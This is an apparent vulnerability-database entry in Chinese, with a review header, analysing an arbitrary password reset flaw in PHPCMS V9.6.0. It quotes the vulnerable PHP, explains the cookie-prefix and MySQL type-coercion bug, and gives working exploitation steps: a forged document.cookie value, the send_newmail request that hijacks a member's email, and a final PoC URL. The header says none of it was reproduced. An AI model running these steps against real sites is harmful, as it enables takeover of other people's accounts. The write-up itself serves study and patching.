---
source: "hatch 补库批 20260928"
product: "PHPCMS9.6.0"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Phpcms V9.6.0 任意密码重置漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：能注册数字前缀用户名、获得加密username Cookie、邮件发送成功、会员userid数值比较"
side_effects: "未执行；本文需注意的操作影响：实际先改会员邮箱再走正常重置，不等于直接任意密码或管理员后台账号重置；2.png是占位，缺完整注册及恢复请求但代码链充分"
source_status: "unknown"
id: "vw-e8ff5cd17afdaa74fc3947b8"
entity_id: "ve-e8ff5cd17afdaa74fc3947b8"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：能注册数字前缀用户名、获得加密username Cookie、邮件发送成功、会员userid数值比较

- **凭据与会话边界（1）**：纠正原分析cookie带前缀导致intval分支未命中，有价值；字符串转为了数组1术语应数值1。抓包中的会话不能视为未认证访问证明；可识别的真实会话值按中段星号遮罩处理，默认演示值和攻击语法保留。需重新取得授权测试会话，不能复用文中值。

- **结论使用边界（2）**：实际先改会员邮箱再走正常重置，不等于直接任意密码或管理员后台账号重置。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **凭据与会话边界（3）**：固定cookie加密值和前缀仅实验；还需受害目标数字ID、邮件/SSO状态，成功返回1仅改邮箱阶段。抓包中的会话不能视为未认证访问证明；可识别的真实会话值按中段星号遮罩处理，默认演示值和攻击语法保留。需重新取得授权测试会话，不能复用文中值。

- **证据待核（4）**：2.png是占位，缺完整注册及恢复请求但代码链充分。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Phpcms V9.6.0 任意密码重置漏洞

一、漏洞简介
------------

二、漏洞影响
------------

Phpcms V9.6.0

三、复现过程
------------

### 漏洞分析

`/phpcms/modules/member/index.php` 第267到312行

    public function send_newmail() {
        $_username = param::get_cookie('_regusername');
        $_userid = param::get_cookie('_reguserid');
        $_ssouid = param::get_cookie('_reguseruid');
        $newemail = $_GET['newemail'];
     
        if($newemail==''){//邮箱为空，直接返回错误
            return '2';
        }
        $this->_init_phpsso();
        $status = $this->client->ps_checkemail($newemail);
        if($status=='-5'){//邮箱被占用
            exit('-1');
        }
        if ($status==-1) {
            $status = $this->client->ps_get_member_info($newemail, 3);
            if($status) {
                $status = unserialize($status); //接口返回序列化，进行判断
                if (!isset($status['uid']) || $status['uid'] != intval($_ssouid)) {
                    exit('-1');
                }
            } else {
                exit('-1');
            }
        }
        //验证邮箱格式
        pc_base::load_sys_func('mail');
        $code = sys_auth($_userid.'|'.microtime(true), 'ENCODE', get_auth_key('email'));
        $url = APP_PATH."index.php?m=member&c=index&a=register&code=$code&verify=1";
     
        //读取配置获取验证信息
        $member_setting = getcache('member_setting');
        $message = $member_setting['registerverifymessage'];
        $message = str_replace(array('{click}','{url}','{username}','{email}','{password}'), array('<a href="'.$url.'">'.L('please_click').'</a>',$url,$_username,$newemail,$password), $message);
     
        if(sendmail($newemail, L('reg_verify_email'), $message)){
            //更新新的邮箱，用来验证
            $this->db->update(array('email'=>$newemail), array('userid'=>$_userid));
            $this->client->ps_member_edit($_username, $newemail, '', '', $_ssouid);
            $return = '1';
        }else{
            $return = '2';
        }
        echo $return;
    }

　　`$_userid`用 `param::get_cookie('_reguserid')` 来获取

跟进去：`/phpv9.6.0/phpcms/libs/classes/param.class.php` 第106-117行。

    public static function get_cookie($var, $default = '') {
        $var = pc_base::load_config('system','cookie_pre').$var;
        $value = isset($_COOKIE[$var]) ? sys_auth($_COOKIE[$var], 'DECODE') : $default;
        if(in_array($var,array('_userid','userid','siteid','_groupid','_roleid'))) {
            $value = intval($value);
        } elseif(in_array($var,array('_username','username','_nickname','admin_username','sys_lang'))) { //  site_model auth
            $value = safe_replace($value);
        }
        return $value;
    }

　　这时候的\$var的值是\_reguserid，
然后获取前缀。`pc_base::load_config('system','cookie_pre')`

　　\$var的值就变成了gggCB\_\_reguserid，然后进到`sys_auth($_COOKIE[$var], 'DECODE')`,由于这个值我们是可控的，那找个可控的地方加密一下，也就是注册的时候，把名字注册成1xxxx(为什么是这样的后面会说)
，然后他会对username进行加密，我们只要注册一个号，然后复制出里面username的值就行。

接着有个if判断，这就是我说文章分析错的地方，这里的\$var的值是gggCB\_\_reguserid，根本不在后面的这个数组里面，所以进入不到\$value
= intval(\$value);

所以不能intval出数字来，所以文章分析错了，但是还是能密码重置。接着看，返回了\$value的值，也就是1xxxx。

省略中间的运行：来到304行，看这句

`$this->db->update(array('email'=>$newemail), array('userid'=>$_userid));`

进行update操作，\$newemail的值是我们给的，\$\_userid是 1xxxx 。

跟进去形成sql修改。语句是这样的。

    UPDATE `phpcms`.`v9_member` SET `email`='aa223d@qq.com' WHERE `userid` = '1xxxx'

然后在mysql中，where 1 = \'1sFdsfdsf\'
是相等的，因为后面的字符串转为了数组1

![1.png](./.resource/PhpcmsV9.6.0任意密码重置漏洞/media/rId25.png)

所以他的语句就变成了

    UPDATE `phpcms`.`v9_member` SET `email`='aa223d@qq.com' WHERE `userid` = '1'

然后重置掉了用户userid为1 的用户

2.png

### 漏洞复现

大概的攻击流程是这样的。

注册一个1xxx
，然后获取cookie中的username的值，然后切换一个浏览器，再次打开网页，在f12中，设置cookie的值，注意\_\_reguserid前面的gggCB也要和username的值一样

`document.cookie='gggCB__reguserid=2f22C0FxoGesxWq73GqUXpuJBDAAEO_KZL5MuEDDeaEj9w'`

然后访问
`/index.php?m=member&c=index&a=send_newmail&siteid=1&newemail=q123456@qq.com`

看到页面返回1就代表成功了，然后就去

`/index.php?m=member&c=index&a=public_forget_password&siteid=1`

输入你的邮箱 重置掉userid=1的密码。

最终poc为

    https://www.0-sec.org/index.php?m=member&c=index&a=send_newmail&siteid=1&newemail=aa222a@qq.com

参考链接
--------

> https://www.cnblogs.com/yangxiaodi/p/6890298.html
